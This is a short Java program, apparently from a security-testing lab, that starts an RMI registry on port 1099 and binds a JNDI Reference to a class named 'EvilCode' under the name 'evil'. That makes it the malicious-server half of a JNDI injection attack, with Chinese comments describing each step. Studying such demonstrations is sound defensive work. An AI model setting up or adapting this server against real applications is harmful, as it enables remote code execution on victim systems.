package com.wwh.security.test;

import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import javax.naming.NamingException;
import javax.naming.Reference;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

public class RMIServer {
    public static void main(String[] args) {
        System.out.println("启动一个RMI服务，端口：1099");
        try {
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();

            // 返回的Java对象

            Reference reference = new Reference("com.wwh.security.test.EvilCode", "com.wwh.security.test.EvilCode",
                    null);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);

            // 把远程对象注册到RMI注册服务器上，并命名为evil
            registry.bind("evil", referenceWrapper);

        } catch (RemoteException | AlreadyBoundException | NamingException e) {
            e.printStackTrace();
        }
    }

}
